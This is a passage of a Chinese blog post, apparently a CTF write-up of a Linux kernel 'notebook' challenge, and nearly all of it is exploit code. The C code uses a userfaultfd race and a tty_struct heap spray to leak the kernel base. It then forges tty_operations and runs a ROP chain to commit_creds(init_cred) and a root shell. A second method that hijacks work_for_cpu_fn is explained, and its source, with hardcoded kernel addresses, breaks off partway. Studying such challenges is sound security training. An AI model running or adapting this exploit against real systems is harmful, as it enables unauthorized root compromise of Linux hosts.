notebook&quot;</span>);<br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    registerUserFaultFd(buf,<span class="hljs-number">0x4000</span>,fault_handler_thread);<br>    <br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        add(i,<span class="hljs-number">0x60</span>,page);<br>        edit(i,TTY_STRUCT_SIZE,page);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evil_edit,(<span class="hljs-type">void</span>*)i);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] All threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <br><br>    <span class="hljs-comment">// heap spraying ---&gt; tty_struct</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x100</span>;i++)&#123;<br>        tty_fd[i]=open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>,O_RDWR);<br>        <span class="hljs-keyword">if</span> (tty_fd[i]==<span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;fuck tty&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        pthread_create(&amp;<span class="hljs-type">add_t</span>, <span class="hljs-literal">NULL</span>, evil_add,(<span class="hljs-type">void</span>*)i);<br>    &#125; <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] All threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <span class="hljs-comment">//check tty_magic 0x5401</span><br>    <br>    gift((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-comment">//printf(&quot;%llx\n&quot;,*((int*)tty_data));</span><br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-type">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    <span class="hljs-comment">//leak kernel_base by tty</span><br>    tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] prepare_kernel_cred: 0x%llx\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] commit_creds: %p\n&quot;</span>, commit_creds);<br><br>    <span class="hljs-comment">//find two notes isn&#x27;t tty</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>, fake_stack_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span> || fake_stack_idx == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;Unable to find two notes,try again&quot;</span>);<br>    <br>    edit(fake_tty_ops_idx,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations),fake_tty_data);<br>    edit(fake_stack_idx,<span class="hljs-number">0x100</span>,rop);<br>    gift((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>, notebook[fake_stack_idx].buf);<br><br>    <span class="hljs-comment">//copy the tty_data to fake_tty_data</span><br>    read(note_fd,tty_data,tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data,tty_data,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">0x200</span>);<br><br>    <span class="hljs-comment">// first migration to tty_struct</span><br>    ((<span class="hljs-keyword">struct</span> tty_operations*)fake_tty_ops_data)-&gt;write=push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret+kernel_offset;<br>    <span class="hljs-comment">//second migration back tty_ops</span><br>    fake_tty_data[<span class="hljs-number">1</span>]=pop_rbx_pop_rbp_ret+kernel_offset;<br>    fake_tty_data[<span class="hljs-number">3</span>]=notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>]=mov_rsp_rbp_pop_rbp_ret+kernel_offset;<br>    <span class="hljs-comment">// third migration to stack</span><br>    fake_tty_ops_data[<span class="hljs-number">1</span>] = pop_rbp_ret + kernel_offset;<br>    fake_tty_ops_data[<span class="hljs-number">2</span>] = notebook[fake_stack_idx].buf;<br>    fake_tty_ops_data[<span class="hljs-number">3</span>] = mov_rsp_rbp_pop_rbp_ret + kernel_offset;<br>    <br>    <span class="hljs-type">int</span> rop_idx=<span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<span class="hljs-comment">//rbp</span><br>    rop[rop_idx++] = pop_rdi_ret + kernel_offset;<br>    rop[rop_idx++] = init_cred+kernel_offset;<br>    rop[rop_idx++] = commit_creds;<br><br>    rop[rop_idx++] = swapgs_restore_regs_and_return_to_usermode+<span class="hljs-number">22</span>+kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = (<span class="hljs-type">size_t</span>)&amp;getRootShell;<br>    rop[rop_idx++] = user_cs;<br>    rop[rop_idx++] = user_rflags;<br>    rop[rop_idx++] = user_sp;<br>    rop[rop_idx++] = user_ss;<br><br>    write(note_fd,rop,fake_stack_idx);<br>    write(note_fd,fake_tty_ops_data,fake_tty_ops_idx);<br>    write(note_fd,fake_tty_data,tty_idx);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] TTY DATA hijack done.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">//trigger</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++)<br>        write(tty_fd[i],page, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中设置cpu和对线程的顺序访问，还有在创建线程后sleep一会，都能提高一下稳定性应该</p><blockquote><p>cpu_set_t pwn_cpu;<br>CPU_ZERO(&amp;pwn_cpu);<br>CPU_SET(0, &amp;pwn_cpu);</p><p>sem_init(&amp;sem_add, 0, 0);<br>sem_post(&amp;sem_edit);<br>sem_wait(&amp;sem_edit);</p><p>sleep(1)</p></blockquote><p>但是实际这种打法还是不太稳定，长亭有种解法用<code>work_for_cpu_fn</code>函数,能稳定利用</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/10-1684500912096.png" alt="10"></p><h4 id="0x03解法2：-2">0x03解法2：</h4><p>就是用<code>work_for_cpu_fn</code>这个函数，可以不用rop</p><blockquote><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。</p></blockquote><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/11.png" alt="11"></p><p>就这句<code>wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</code></p><p>在ida里是这样的</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/12.png" alt="12"></p><p>在这题里我们</p><p>第一次使用</p><blockquote><p>a1+32(wfc-&gt;fn)=prepare_kernel_cred</p><p>a1+40(wfc-&gt;arg)=Null</p><p>就会执行prepare_kernel_cred(Null)</p><p>返回值存到a1+48(wfc-&gt;ret)</p></blockquote><p>第二次使用</p><blockquote><p>a1+32(wfc-&gt;fn)=commit_creds</p><p>a1+40(wfc-&gt;arg)=第一次的返回值</p><p>就会执行commit_creds(prepare_kernel_cred(Null))提权到root</p></blockquote><p>解法转变为劫持tty_ops-&gt;ioctl为work_for_cpu_fn</p><blockquote><p>因为 tty_struct[4] 处成员 <code>ldisc_sem</code> 为信号量，在执行到 work_for_cpu_fn 之前<strong>该值会被更改</strong></p></blockquote><p>然后执行两次，一次prepare_kernel_cred(Null)，一次commit_creds(第一次的返回值)</p><h5 id="Exp-2">Exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -o try -pthread -static -masm=intel -Os try.c -lutil</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> work_for_cpu_fn 0xffffffff8109eb90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> cred_init 0xffffffff8250a0e9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> init_cred 0xffffffff8225c940</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> max_spray_times 0x100</span><br><br><span class="hljs-type">int</span> note_fd=<span class="hljs-number">-1</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> tty_fd[<span class="hljs-number">0x800</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *buf,*page;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> cnt;<br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">sem_t</span> sem_add, sem_edit;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">notearg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span>* buf;<br>&#125; Note;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">void</span>* buf;<br>    <span class="hljs-type">size_t</span> size;<br>    <br>&#125;notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">            <span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>    <span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span 